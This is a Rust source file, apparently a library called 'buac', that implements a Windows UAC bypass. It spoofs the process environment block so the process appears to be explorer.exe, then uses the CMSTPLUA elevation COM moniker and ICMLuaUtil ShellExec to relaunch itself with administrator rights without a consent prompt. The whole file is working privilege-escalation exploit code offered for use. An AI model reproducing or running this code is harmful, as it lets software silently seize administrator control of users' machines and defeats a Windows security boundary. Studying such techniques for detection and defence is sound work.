use std::ffi::c_void;
use std::os::windows::ffi::OsStrExt;
use std::ptr::{null, null_mut};
use windows_sys::core::{GUID, HRESULT};
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, S_FALSE, S_OK};
use windows_sys::Win32::Security::{
    GetTokenInformation, TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY,
};
use windows_sys::Win32::System::Com::{
    CoGetObject, CoInitializeEx, CoUninitialize, BIND_OPTS3, CLSCTX_LOCAL_SERVER,
    COINIT_APARTMENTTHREADED,
};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
use windows_sys::Win32::UI::WindowsAndMessaging::SW_SHOW;

const RPC_E_CHANGED_MODE: HRESULT = 0x80010106u32 as i32;

const IID_ICMLUAUTIL: GUID = GUID {
    data1: 0x6EDD6D74,
    data2: 0xC007,
    data3: 0x4E75,
    data4: [0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C],
};

#[repr(C)]
struct ICMLuaUtilVtbl {
    _query_interface: *const c_void,
    _add_ref: *const c_void,
    release: unsafe extern "system" fn(this: *mut ICMLuaUtil) -> u32,
    _reserved: [*const c_void; 6],
    shell_exec: unsafe extern "system" fn(
        this: *mut ICMLuaUtil,
        lp_file: *const u16,
        lp_parameters: *const u16,
        lp_directory: *const u16,
        f_mask: u32,
        n_show: u32,
    ) -> HRESULT,
}

#[repr(C)]
struct ICMLuaUtil {
    lp_vtbl: *const ICMLuaUtilVtbl,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

type RtlInitUnicodeStringFn = unsafe extern "system" fn(*mut UnicodeString, *const u16);
type RtlAcquirePebLockFn = unsafe extern "system" fn();
type RtlReleasePebLockFn = unsafe extern "system" fn();

struct Ntdll {
    rtl_init_unicode_string: RtlInitUnicodeStringFn,
    rtl_acquire_peb_lock: RtlAcquirePebLockFn,
    rtl_release_peb_lock: RtlReleasePebLockFn,
}

impl Ntdll {
    unsafe fn load() -> Result<Self, Error> {
        let ntdll = GetModuleHandleW(windows_sys::core::w!("ntdll.dll"));
        if ntdll.is_null() {
            return Err(Error::Masquerade("ntdll.dll module handle not found"));
        }

        let p_init_unicode = GetProcAddress(ntdll, c"RtlInitUnicodeString".as_ptr() as *const u8);
        let p_acquire_lock = GetProcAddress(ntdll, c"RtlAcquirePebLock".as_ptr() as *const u8);
        let p_release_lock = GetProcAddress(ntdll, c"RtlReleasePebLock".as_ptr() as *const u8);

        let rtl_init_unicode_string: RtlInitUnicodeStringFn = p_init_unicode
            .ok_or(Error::Masquerade("RtlInitUnicodeString export not found"))
            .map(|f| std::mem::transmute(f))?;

        let rtl_acquire_peb_lock: RtlAcquirePebLockFn = p_acquire_lock
            .ok_or(Error::Masquerade("RtlAcquirePebLock export not found"))
            .map(|f| std::mem::transmute(f))?;

        let rtl_release_peb_lock: RtlReleasePebLockFn = p_release_lock
            .ok_or(Error::Masquerade("RtlReleasePebLock export not found"))
            .map(|f| std::mem::transmute(f))?;

        Ok(Self {
            rtl_init_unicode_string,
            rtl_acquire_peb_lock,
            rtl_release_peb_lock,
        })
    }
}

#[derive(Debug)]
pub enum Error {
    ComInit(HRESULT),
    Masquerade(&'static str),
    Activation(HRESULT),
    ShellExec(HRESULT),
    TokenQuery(u32),
    CurrentExePath(std::io::Error),
}

impl std::fmt::Display for Error {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ComInit(hr) => write!(f, "COM initialization failed with HRESULT: {hr:#010X}"),
            Self::Masquerade(msg) => write!(f, "Process masquerade failed: {msg}"),
            Self::Activation(hr) => {
                write!(f, "Elevation moniker activation failed with HRESULT: {hr:#010X}")
            }
            Self::ShellExec(hr) => write!(f, "ShellExec failed with HRESULT: {hr:#010X}"),
            Self::TokenQuery(code) => write!(f, "Token query failed with OS error {code}"),
            Self::CurrentExePath(err) => {
                write!(f, "Failed to retrieve current executable path: {err}")
            }
        }
    }
}

impl std::error::Error for Error {}

fn to_wide(s: &str) -> Vec<u16> {
    std::ffi::OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

fn encode_arg(arg: &str) -> String {
    if arg.is_empty() {
        return "\"\"".to_string();
    }
    if !arg.contains([' ', '\t', '\n', '\x0b', '\"']) {
        return arg.to_string();
    }

    let mut result = String::with_capacity(arg.len() + 2);
    result.push('"');

    let mut backslashes = 0;
    for c in arg.chars() {
        if c == '\\' {
            backslashes += 1;
        } else if c == '"' {
            for _ in 0..backslashes * 2 + 1 {
                result.push('\\');
            }
            backslashes = 0;
            result.push('"');
        } else {
            for _ in 0..backslashes {
                result.push('\\');
            }
            backslashes = 0;
            result.push(c);
        }
    }

    for _ in 0..backslashes * 2 {
        result.push('\\');
    }
    result.push('"');

    result
}

pub fn is_elevated() -> Result<bool, Error> {
    unsafe {
        let mut token: HANDLE = null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return Err(Error::TokenQuery(GetLastError()));
        }

        struct TokenGuard(HANDLE);
        impl Drop for TokenGuard {
            fn drop(&mut self) {
                unsafe { CloseHandle(self.0) };
            }
        }
        let _guard = TokenGuard(token);

        let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
        let mut return_length = 0u32;

        let result = GetTokenInformation(
            token,
            TokenElevation,
            &mut elevation as *mut _ as *mut c_void,
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut return_length,
        );

        if result == 0 {
            return Err(Error::TokenQuery(GetLastError()));
        }

        Ok(elevation.TokenIsElevated != 0)
    }
}

#[cfg(target_arch = "x86_64")]
struct PebOffsets {
    ldr: usize,
    params: usize,
    in_load_order_list: usize,
    full_dll_name: usize,
    base_dll_name: usize,
    image_path: usize,
    command_line: usize,
}

#[cfg(target_arch = "x86_64")]
const OFFSETS: PebOffsets = PebOffsets {
    ldr: 0x18,
    params: 0x20,
    in_load_order_list: 0x10,
    full_dll_name: 0x48,
    base_dll_name: 0x58,
    image_path: 0x60,
    command_line: 0x70,
};

#[cfg(target_arch = "x86")]
struct PebOffsets {
    ldr: usize,
    params: usize,
    in_load_order_list: usize,
    full_dll_name: usize,
    base_dll_name: usize,
    image_path: usize,
    command_line: usize,
}

#[cfg(target_arch = "x86")]
const OFFSETS: PebOffsets = PebOffsets {
    ldr: 0x0C,
    params: 0x10,
    in_load_order_list: 0x0C,
    full_dll_name: 0x24,
    base_dll_name: 0x2C,
    image_path: 0x38,
    command_line: 0x40,
};

#[cfg(target_arch = "x86_64")]
#[inline]
unsafe fn get_peb() -> *mut u8 {
    let teb: *mut u8;
    std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb, options(pure, nomem, nostack));
    if teb.is_null() {
        return null_mut();
    }
    *(teb.add(0x60) as *mut *mut u8)
}

#[cfg(target_arch = "x86")]
#[inline]
unsafe fn get_peb() -> *mut u8 {
    let teb: *mut u8;
    std::arch::asm!("mov {}, fs:[0x18]", out(reg) teb, options(pure, nomem, nostack));
    if teb.is_null() {
        return null_mut();
    }
    *(teb.add(0x30) as *mut *mut u8)
}

#[cfg(not(any(target_arch = "x86_64", target_arch = "x86")))]
compile_error!("buac only supports x86 and x86_64 Windows architectures");

struct MasqueradeGuard {
    image_path: *mut UnicodeString,
    orig_image_path: UnicodeString,
    command_line: *mut UnicodeString,
    orig_command_line: UnicodeString,
    full_dll_name: *mut UnicodeString,
    orig_full_dll_name: UnicodeString,
    base_dll_name: *mut UnicodeString,
    orig_base_dll_name: UnicodeString,
    acquire_lock: RtlAcquirePebLockFn,
    release_lock: RtlReleasePebLockFn,
}

impl Drop for MasqueradeGuard {
    fn drop(&mut self) {
        unsafe {
            (self.acquire_lock)();
            *self.image_path = self.orig_image_path;
            *self.command_line = self.orig_command_line;
            *self.full_dll_name = self.orig_full_dll_name;
            *self.base_dll_name = self.orig_base_dll_name;
            (self.release_lock)();
        }
    }
}

unsafe fn masquerade_process() -> Result<MasqueradeGuard, Error> {
    let ntdll = Ntdll::load()?;

    let peb = get_peb();
    if peb.is_null() {
        return Err(Error::Masquerade("PEB address is null"));
    }

    let ldr = *(peb.add(OFFSETS.ldr) as *mut *mut u8);
    let process_parameters = *(peb.add(OFFSETS.params) as *mut *mut u8);

    if ldr.is_null() {
        return Err(Error::Masquerade("PEB Ldr pointer is null"));
    }
    if process_parameters.is_null() {
        return Err(Error::Masquerade("PEB ProcessParameters pointer is null"));
    }

    let in_load_order_list = *(ldr.add(OFFSETS.in_load_order_list) as *mut *mut u8);
    if in_load_order_list.is_null() {
        return Err(Error::Masquerade("Ldr InLoadOrderModuleList pointer is null"));
    }

    let image_path = process_parameters.add(OFFSETS.image_path) as *mut UnicodeString;
    let command_line = process_parameters.add(OFFSETS.command_line) as *mut UnicodeString;
    let full_dll_name = in_load_order_list.add(OFFSETS.full_dll_name) as *mut UnicodeString;
    let base_dll_name = in_load_order_list.add(OFFSETS.base_dll_name) as *mut UnicodeString;

    let orig_image_path = *image_path;
    let orig_command_line = *command_line;
    let orig_full_dll_name = *full_dll_name;
    let orig_base_dll_name = *base_dll_name;

    (ntdll.rtl_acquire_peb_lock)();

    let fake_full_path = windows_sys::core::w!("C:\\Windows\\explorer.exe");
    let fake_base_name = windows_sys::core::w!("explorer.exe");

    (ntdll.rtl_init_unicode_string)(image_path, fake_full_path);
    (ntdll.rtl_init_unicode_string)(command_line, fake_base_name);
    (ntdll.rtl_init_unicode_string)(full_dll_name, fake_full_path);
    (ntdll.rtl_init_unicode_string)(base_dll_name, fake_base_name);

    (ntdll.rtl_release_peb_lock)();

    Ok(MasqueradeGuard {
        image_path,
        orig_image_path,
        command_line,
        orig_command_line,
        full_dll_name,
        orig_full_dll_name,
        base_dll_name,
        orig_base_dll_name,
        acquire_lock: ntdll.rtl_acquire_peb_lock,
        release_lock: ntdll.rtl_release_peb_lock,
    })
}

struct ComGuard {
    need_uninit: bool,
}

impl Drop for ComGuard {
    fn drop(&mut self) {
        if self.need_uninit {
            unsafe { CoUninitialize() };
        }
    }
}

struct LuaUtilGuard(*mut ICMLuaUtil);

impl Drop for LuaUtilGuard {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe {
                let vtbl = (*self.0).lp_vtbl;
                ((*vtbl).release)(self.0);
            }
        }
    }
}

pub fn execute(target_path: &str, arguments: Option<&str>) -> Result<(), Error> {
    unsafe {
        let _masquerade_guard = masquerade_process()?;

        let hr_init = CoInitializeEx(null(), COINIT_APARTMENTTHREADED as u32);
        let _com_guard = ComGuard {
            need_uninit: hr_init == S_OK || hr_init == S_FALSE,
        };

        if hr_init < 0 && hr_init != RPC_E_CHANGED_MODE {
            return Err(Error::ComInit(hr_init));
        }

        let mut bind_opts: BIND_OPTS3 = std::mem::zeroed();
        bind_opts.Base.Base.cbStruct = std::mem::size_of::<BIND_OPTS3>() as u32;
        bind_opts.Base.dwClassContext = CLSCTX_LOCAL_SERVER;

        let mut lua_util: *mut ICMLuaUtil = null_mut();
        let hr_get = CoGetObject(
            windows_sys::core::w!(
                "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
            ),
            &bind_opts as *const _ as *const _,
            &IID_ICMLUAUTIL,
            &mut lua_util as *mut _ as *mut *mut c_void,
        );

        if hr_get != S_OK || lua_util.is_null() {
            return Err(Error::Activation(hr_get));
        }

        let _lua_guard = LuaUtilGuard(lua_util);

        let file_w = to_wide(target_path);
        let params_w = arguments.map(to_wide);
        let params_ptr = params_w.as_ref().map_or(null(), |p| p.as_ptr());

        let hr_exec = ((*(*lua_util).lp_vtbl).shell_exec)(
            lua_util,
            file_w.as_ptr(),
            params_ptr,
            null(),
            0,
            SW_SHOW as u32,
        );

        if hr_exec != S_OK {
            return Err(Error::ShellExec(hr_exec));
        }

        Ok(())
    }
}

pub fn spawn_elevated() -> Result<bool, Error> {
    if is_elevated()? {
        return Ok(false);
    }

    let current_exe = std::env::current_exe().map_err(Error::CurrentExePath)?;
    let current_exe_str = current_exe.to_string_lossy();

    let args: Vec<String> = std::env::args().skip(1).collect();
    let args_str = if args.is_empty() {
        None
    } else {
        Some(
            args.iter()
                .map(|a| encode_arg(a))
                .collect::<Vec<String>>()
                .join(" "),
        )
    };

    execute(&current_exe_str, args_str.as_deref())?;
    Ok(true)
}

pub fn elevate() -> Result<(), Error> {
    if spawn_elevated()? {
        std::process::exit(0);
    }
    Ok(())
}